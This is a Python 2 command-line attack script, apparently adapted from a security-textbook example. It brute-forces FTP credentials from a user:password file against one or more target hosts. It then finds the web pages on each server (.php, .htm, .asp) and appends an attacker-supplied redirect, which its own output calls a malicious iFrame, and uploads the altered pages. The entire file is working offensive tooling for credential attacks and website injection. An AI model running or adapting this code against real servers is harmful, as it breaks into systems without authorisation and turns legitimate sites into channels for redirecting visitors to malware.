import ftplib
import optparse
import time

#Function attempts an anonymous login to FTP server
def anonLogin(hostname):
	try:
		ftp = ftplib.FTP(hostname) #setting the ftp host
		ftp.login('anonymous', 'not@realemail.com') #make an anonymous connection to ftp server
		print '\n [*] ' + str(hostname) + ' FTP Anonymous Logon Succeeded' #prints if login successful
		ftp.quit() #close connection
		return True #True means anonymous login was successful

	except Exception, e:
		print '\n[-] ' +str(hostname) + ' FTP Anonymous Logon Failed'#prints if login failed
		return False #False means anonymous login failed

#Attempts to make FTP connection by brute forcing password that it pulls from text file
def bruteLogin(hostname, passwdFile):
	pf = open(passwdFile, 'r') #open the password file
	for line in pf.readlines(): #iterate through every line in the file
		time.sleep(1)
		username = line.split(':')[0] #everything before the colon
		password = line.split(':')[1].strip('\r').strip('\n') #after the colon
		print '[+] Trying: '+username+":"+password

		try:
			ftp = ftplib.FTP(hostname) #setting the ftp host
			ftp.login(username, password)
			print '\n[*] ' + str(hostname) + ' FTP login succeeded: ' +username+":" +password
			ftp.quit()
			return (username, password)

		except Exception, e:
			pass
	
	print '\n[-] Could not brute force the FTP Credentials.'
	pf.close()
	return (None, None)


#searches for files that end in php, htm, or asp in the FTP server directory and returns them
def returnDefault(ftp):
	try:
		dirList = ftp.nlst() #gets the directory contents, adds to array
	except:
		dirList = [] #sets the directory list to empty array
		print '[-] Could not list directory contents.'
		print '[-] Skipping To Next Target.'
		return

	retList = [] #array to add discovered webpage files too
	for filename in dirList: #iterate through all of the files in the directory array
		fn = filename.lower()
		if '.php' in fn or '.htm' in fn or '.asp' in fn:
			print '[+] Found default page: ' + filename
			retList.append(filename) #appends webpage file to array

	return retList

def injectPage(ftp, page, redirect):
	f = open(page + '.tmp', 'w') #opens temporary version of the webpage
	ftp.retrlines('RETR ' + page, f.write)
	print '[+] Downloaded page: ' + page
	f.write(redirect) #writes the redirect script to the page
	f.close()

	print '[+] Inject malicious iFrame on: ' + page
	ftp.storlines('STOR ' + page, open(page + '.tmp',))
	print '[+] Uploaded injected page: ' + page

def attack(username, password, tgtHost, redirect):
	ftp = ftplib.FTP(tgtHost)
	ftp.login(username, password)
	defPages = returnDefault(ftp)
	for defPage in defPages:
		injectPage(ftp, defPage, redirect)

def main():

	parser = optparse.OptionParser('usage%prog -H <target host[s]> -r <redirect page> -f <userpass file>')
	parser.add_option('-H', dest='tgtHost', type='string', help='specify the target host')
	parser.add_option('-f', dest='passwdFile', type='string', help='specify the userpass file')
	parser.add_option('-r', dest='redirect', type='string', help='specify the redirection page')

	(options, args) = parser.parse_args()
	tgtHost = str(options.tgtHost).split(',')
	passwdFile = options.passwdFile
	redirect = options.redirect

	if tgtHost == None or redirect == None or passwdFile == None:
		print parser.usage
		exit(0)

	for host in tgtHost:
		username = None
		password = None
#commenting out the anonymous login as my ftp server allows anonymous logins, but does not allow for files to be modified while logged in anonymously.  This causes the script to crash		
#		if anonLogin(host) == True:
#			username = 'anonymous'
#			password = 'abc123'
#			print '[+] Using Anonymous to carry out attack'
#			attack(username, password, host, redirect)
		if passwdFile != None:
			(username, password) = bruteLogin(host, passwdFile)
		if password != None:
			print '[+] Using creds: ' + username + '/' +password + ' to attack'
			attack(username, password, host, redirect)

if __name__ == '__main__':
	main()
